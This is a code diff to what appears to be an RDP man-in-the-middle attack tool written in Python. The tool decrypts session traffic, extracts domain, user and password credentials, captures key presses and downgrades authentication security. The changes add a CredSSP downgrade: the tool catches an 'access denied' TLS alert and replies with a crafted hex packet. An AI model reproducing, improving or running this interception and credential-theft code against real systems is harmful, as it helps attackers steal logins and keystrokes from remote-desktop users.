@@ -332,8 +332,6 @@ def decrypt(bytes, From="Client"):
             cleartext = rc4_decrypt(bytes[offset:], From=From)
 
     if not cleartext == b"":
-        #  print("Ciphertext: ")
-        #  hexdump(bytes[offset:offset+16])
         if args.debug:
             print("Cleartext: ")
             hexdump(cleartext)
@@ -370,7 +368,7 @@ def generate_session_keys():
 
     global crypto
 
-    # Non-Fips
+    # Non-Fips, 128bit key
 
     pre_master_secret = (crypto["client_rand"][:24] +
             crypto["server_rand"][:24])
@@ -425,7 +423,6 @@ def extract_credentials(bytes, m):
         struct.unpack('>H', unhexlify(x))[0]
         for x in m.groups()
     ]
-    # TODO ordentlich machen
     offset = 37
     if domlen + userlen + pwlen < len(bytes):
         domain = substr(bytes, offset, domlen).decode("utf-16")
@@ -572,11 +569,11 @@ def parse_rdp_packet(bytes, From="Client"):
     regex = b".*0d00(.{4}).{164}0000" ## TODO
     m = re.match(regex, hexlify(bytes))
     if m and From == "Client":
+        # A parsing error here shouldn't be a show stopper, so catch exceptions
         try:
             result = extract_keyboard_layout(bytes, m)
         except:
-            print("Error while extracting keyboard layout information")
-            # A parsing error here shouldn't be a show stopper
+            print("Failed to extract keyboard layout information")
 
     if len(bytes)>3 and bytes[-2] in [0,1,2,3] and result == b"":
         result = extract_key_press(bytes)
@@ -662,7 +659,7 @@ def downgrade_auth(bytes):
     # 0: standard rdp security
     # 1: TLS instead
     # 2: CredSSP (NTLMv2 or Kerberos)
-    # 8: CredSSP + Early User Authorization
+    # 8: Early User Authorization
     if m and RDP_PROTOCOL > args.downgrade:
         print("Downgrading authentication options from %d to %d" %
               (RDP_PROTOCOL, args.downgrade))
@@ -723,6 +720,14 @@ def close():
     return False
 
 
+def read_data(sock):
+    data = sock.recv(4096)
+    if len(data) == 4096:
+        while len(data)%4096 == 0:
+            data += sock.recv(4096)
+    return data
+
+
 def forward_data():
     readable, _, _ = select.select([local_conn, remote_socket], [], [])
     for s_in in readable:
@@ -732,10 +737,14 @@ def forward_data():
         elif s_in == remote_socket:
             From = "Server"
             to_socket = local_conn
-        data = s_in.recv(4096)
-        if len(data) == 4096:
-            while len(data)%4096 == 0:
-                data += s_in.recv(4096)
+        try:
+            data = read_data(s_in)
+        except ssl.SSLError as e:
+            if "alert access denied" in str(e):
+                print("Downgrading CredSSP")
+                local_conn.send(unhexlify(b"300da003020104a4060204c000005e"))
+            else:
+                print("SSLError: %s" % str(e))
         if data == b"": return close()
         dump_data(data, From=From)
         parse_rdp(data, From=From)
@@ -766,6 +775,9 @@ def run():
                 break
         except (ssl.SSLError, ssl.SSLEOFError) as e:
             print("SSLError: %s" % str(e))
+            if "alert access denied" in str(e):
+                print("Downgrading CredSSP")
+                local_conn.send(unhexlify(b"300da003020104a4060204c000005e"))
         except (ConnectionResetError, OSError):
             print("The client has disconnected")
 
